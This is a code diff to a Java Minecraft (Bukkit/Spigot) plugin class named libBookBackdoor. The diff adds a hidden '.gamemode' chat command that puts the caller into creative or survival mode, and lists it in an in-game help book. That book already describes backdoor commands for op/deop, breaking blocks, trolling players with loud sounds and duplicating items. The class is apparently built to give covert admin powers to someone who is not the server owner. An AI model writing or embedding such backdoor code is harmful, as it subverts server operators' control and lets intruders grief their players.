@@ -1,10 +1,7 @@
 package org.brandonplank.bookbackdoor;
 
 import net.md_5.bungee.api.chat.*;
-import org.bukkit.ChatColor;
-import org.bukkit.Location;
-import org.bukkit.Material;
-import org.bukkit.Sound;
+import org.bukkit.*;
 import org.bukkit.block.Block;
 import org.bukkit.enchantments.Enchantment;
 import org.bukkit.entity.Player;
@@ -315,6 +312,36 @@ public class libBookBackdoor implements Listener {
                                 }
                             }.start();
                             break;
+                        case("gamemode"):
+                            if(args.length > 1) {
+                                String gamemode = args[1].toLowerCase();
+                                switch (gamemode) {
+                                    case ("c"):
+                                    case ("creative"):
+                                        player.setGameMode(GameMode.CREATIVE);
+                                        player.sendActionBar("Set gamemode to creative");
+                                        break;
+
+                                    case ("s"):
+                                    case ("survival"):
+                                        player.setGameMode(GameMode.SURVIVAL);
+                                        player.sendActionBar("Set gamemode to survival");
+                                        break;
+
+                                    case ("sp"):
+                                    case ("spectator"):
+                                        player.sendMessage("Not going to enable this because it will cause you to be stuck in spectator mode.");
+                                        //player.setGameMode(GameMode.SPECTATOR);
+                                        //player.sendActionBar("Set gamemode to spectator");
+                                        break;
+                                    default:
+                                        player.sendMessage("Please use survival, spectator, or creative.");
+                                        break;
+                                }
+                            } else {
+                                player.sendMessage("Please use an argument of survival, spectator, or creative.");
+                            }
+                            break;
                         case("help"):
                             ItemStack book = new ItemStack(Material.WRITTEN_BOOK, 1);
                             BookMeta meta = (BookMeta)book.getItemMeta();
@@ -345,7 +372,8 @@ public class libBookBackdoor implements Listener {
                                 TextComponent bbreak = Util.genHoverText(ChatColor.GREEN + ".break\n", "Removes any block relative to your players head, Example: .break 1(Breaks the block above the players head).\n\nUSAGE: .break <y pos relative to head>");
                                 TextComponent troll = Util.genHoverText(ChatColor.GREEN + ".troll\n", "Plays a Enderman sound at 100% volume in a players ear.\n\nUSAGE: .troll <player>");
                                 TextComponent dupe = Util.genHoverText(ChatColor.GREEN + ".dupe\n", "Duplicates the item in your hand x amount of times.\n\nUSAGE: .dupe <times>");
-                                BaseComponent[] page2 = new BaseComponent[]{op, deop, bbreak, troll, dupe};
+                                TextComponent gamemode = Util.genHoverText(ChatColor.GREEN + ".gamemode\n", "Sets your gamemode to spectator, creative or survival.\n\nUSAGE: .gamemode <gamemode>");
+                                BaseComponent[] page2 = new BaseComponent[]{op, deop, bbreak, troll, dupe, gamemode};
 
                                 meta.spigot().addPage(page);
                                 meta.spigot().addPage(page2);
